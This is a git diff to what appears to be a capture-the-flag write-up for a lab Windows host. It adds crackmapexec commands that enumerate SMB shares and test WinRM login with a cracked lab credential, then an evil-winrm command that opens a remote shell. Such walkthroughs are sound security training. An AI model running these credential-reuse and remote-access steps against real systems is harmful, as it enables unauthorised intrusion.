@@ -166,8 +166,8 @@ fsmith:Thestrokes23
 ---
 
 ## SMB
-### Enumerate Shares
-  - 
+### Enumerate SMB Shares
+  - Enumerate the shares available, which are shared directories or resources that can be accessed.
 ```CSS
 ▶ crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares
 ```
@@ -175,3 +175,21 @@ fsmith:Thestrokes23
 
 ---
 
+## WINRM
+### Login
+  - Check for `Windows Remote Management` login using the found credentials.
+```CSS
+▶ crackmapexec winrm 10.10.10.175 -u fsmith -p Thestrokes23
+```
+![image](https://user-images.githubusercontent.com/83878909/232202957-f0300681-06e3-462b-ac69-5d2b4a84df3b.png)
+
+---
+
+### Foothold
+  - Login as user `fsmith`.
+```CSS
+▶ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+```
+![image](https://user-images.githubusercontent.com/83878909/232203185-5855b62c-6fcc-4267-878c-f6748b30112d.png)
+
+---
